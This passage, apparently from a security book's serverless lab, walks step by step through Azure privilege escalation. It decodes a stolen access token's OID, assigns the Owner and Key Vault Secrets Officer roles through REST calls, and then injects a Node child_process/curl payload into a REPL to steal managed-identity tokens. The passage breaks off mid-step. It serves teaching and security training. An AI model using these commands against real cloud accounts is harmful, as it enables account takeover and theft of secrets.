
```
PAYLOAD=$(echo $ACCESS_TOKEN | cut -d "." -f2)
FIXED=$(echo "$PAYLOAD" | tr '_-' '/+' | \
    awk '{printf "%s%s", $0, substr("===", (length($0)%4)+1)}')

echo "$FIXED" | base64 --decode 2>/dev/null | jq -r '.oid'
```

### 10. Store the retrieved OID (Principal ID) in an environment variable (`PRINCIPAL_ID`):

```
PRINCIPAL_ID="[SPECIFY OID VALUE]"
```

###### Caution

Make sure to replace `[SPECIFY OID VALUE]` with the appropriate `oid` value before running the command.

### 11. Retrieve the Owner Role ID and store it in an environment variable (`OWNER_ROLE_ID`):

```
OWNER_ROLE_ID=$(az role definition list --name "Owner" \
    --query "[].id" -o tsv)

echo $OWNER_ROLE_ID
```

This gives you an output value similar to this:

```
/subscriptions/.../providers/Microsoft.Authorization/roleDefinitions/...
```

### 12. Generate a unique identifier and store the resulting value in an environment variable (`ROLE_ASSIGNMENT_ID`):

```
ROLE_ASSIGNMENT_ID=$(uuidgen)
```

### 13. Assign the Owner role to the managed identity of the serverless function:

```
URL_1="https://management.azure.com/subscriptions/$SUBSCRIPTION_ID"
URL_2="providers/Microsoft.Authorization"
URL_3="roleAssignments/$ROLE_ASSIGNMENT_ID?api-version=2022-04-01"

URL="$URL_1/$URL_2/$URL_3"

curl -X PUT $URL \
     -H "Authorization: Bearer $ACCESS_TOKEN" \
     -H "Content-Type: application/json" \
     -d "{
           \"properties\": {
             \"roleDefinitionId\": \"$OWNER_ROLE_ID\",
             \"principalId\": \"$PRINCIPAL_ID\"
           }
         }"
```

###### Note

Since the managed identity was granted the User Access Administrator role, an attacker with its access token can escalate it to Owner (or any other role).

### 14. Inspect the details of the Key Vault Secrets Officer role to check its permissions and scope:

```
az role definition list --name "Key Vault Secrets Officer" -o json
```

This yields the following output:

```
[
  {
    "assignableScopes": [
      "/"
    ],
    "createdBy": null,
    "createdOn": "2020-05-19T17:52:47.144924+00:00",
    "description": "Perform any action on the secrets of a key vault...",
    "id": ".../roleDefinitions/b86a8fe4-44ce-4948-aee5-eccb2c155cd7",
    "name": "b86a8fe4-44ce-4948-aee5-eccb2c155cd7",
    "permissions": [
      {
        "actions": [
          "Microsoft.Authorization/*/read",
          "Microsoft.Insights/alertRules/*",
          "Microsoft.Resources/deployments/*",
          "Microsoft.Resources/subscriptions/resourceGroups/read",
          "Microsoft.Support/*",
          "Microsoft.KeyVault/checkNameAvailability/read",
          "Microsoft.KeyVault/deletedVaults/read",
          "Microsoft.KeyVault/locations/*/read",
          "Microsoft.KeyVault/vaults/*/read",
          "Microsoft.KeyVault/operations/read"
        ],
        "condition": null,
        "conditionVersion": null,
        "dataActions": [
          "Microsoft.KeyVault/vaults/secrets/*"
        ],
        "notActions": [],
        "notDataActions": []
      }
    ],
    "roleName": "Key Vault Secrets Officer",
    "roleType": "BuiltInRole",
    "type": "Microsoft.Authorization/roleDefinitions",
    "updatedBy": null,
    "updatedOn": "2021-11-11T20:14:30.779347+00:00"
  }
]
```

Here, with the Key Vault Secrets Officer role, a principal can perform any action on the secrets of a Key Vault, except manage permissions.

### 15. Retrieve the Key Vault Secrets Officer role definition ID and store it in an environment variable (`ROLE_DEFINITION_ID`):

```
ROLE_DEFINITION_DETAILS=$(az role definition list \
  --name "Key Vault Secrets Officer" -o json)

ROLE_DEFINITION_ID=$(echo $ROLE_DEFINITION_DETAILS | jq -r '.[0].id')
echo $ROLE_DEFINITION_ID
```

### 16. Generate a unique identifier and store the resulting value in an environment variable (`ROLE_ASSIGNMENT_ID`):

```
ROLE_ASSIGNMENT_ID=$(uuidgen)
```

### 17. Assign the Key Vault Secrets Officer role to the managed identity of the Azure function:

```
URL_1="https://management.azure.com/subscriptions/$SUBSCRIPTION_ID"
URL_2="resourceGroups/$RESOURCE_GROUP/providers"
URL_3="Microsoft.KeyVault/vaults/$KEYVAULT_NAME"
URL_4="providers/Microsoft.Authorization"
URL_5="roleAssignments/$ROLE_ASSIGNMENT_ID?api-version=2022-04-01"

URL="$URL_1/$URL_2/$URL_3/$URL_4/$URL_5"

curl -X PUT $URL \
     -H "Authorization: Bearer $ACCESS_TOKEN" \
     -H "Content-Type: application/json" \
     -d "{
           \"properties\": {
             \"roleDefinitionId\": \"$ROLE_DEFINITION_ID\",
             \"principalId\": \"$PRINCIPAL_ID\"
           }
         }"
```

Since the `PRINCIPAL_ID` used in the command corresponds to the OID of the managed identity of the serverless function, the role assignment grants that identity the ability to perform actions on Key Vault secrets, based on the permissions of the Key Vault Secrets Officer role.

###### Note

Given that the managed identity has been granted the User Access Administrator and Owner roles, an attacker with its access token can assign it the Key Vault Secrets Officer role (or any other role). If you are wondering why the Key Vault Secrets Officer role needs to be assigned separately, it’s because the Owner role grants only control-plane management of the Key Vault resource (which excludes access to the secrets inside). To read or modify secrets (data-plane operations), the managed identity also needs a Key Vault–specific role such as Key Vault Secrets Officer.

Let’s quickly review what you have so far. As illustrated in [Figure 12-2](#ch12.html#chapter-12-mid), you have a serverless function with a managed identity associated with the following roles: Contributor, User Access Administrator, Owner, and Key Vault Secrets Officer.

![](assets/lsse_1202.png)

Since the function app’s managed identity now has the permissions to access Key Vault secrets, you’ll be able to retrieve the secrets directly by using exfiltrated access tokens. In addition, because the managed identity holds Owner-level permissions, an attacker who obtains its access token can perform control-plane actions—such as assigning or modifying roles—that could be leveraged to gain data-plane access. This means the attacker could also use the managed identity to access other Azure resources within the Serverless Lab account, extending their reach beyond the function app and Key Vault depending on resource scope and role assignments.

### 1. With everything ready, let’s run the `tester.rb` script:

```
ruby tester.rb
```

### 2. Inside the script’s REPL after `Enter an expression (or type 'exit' to quit)`, run this command as a single line to fetch an access token using the managed identity. Copy the output value (after `[OUTPUT RESPONSE]`) into a local text file (TAG: `ACCESS_TOKEN`):

```
require("child_process").execSync(
   `curl -s -H "X-IDENTITY-HEADER: ${process.env.IDENTITY_HEADER}"
   "${process.env.IDENTITY_ENDPOINT}
   ?resource=https://management.azure.com/&api-version=2019-08-01"`,
   { encoding: "utf8" }
);
```

Run this command as a single line to fetch another access token using the managed identity. Copy the output value (after `[OUTPUT RESPONSE]`) into a local text file (TAG: `ACCESS_TOKEN_2`):
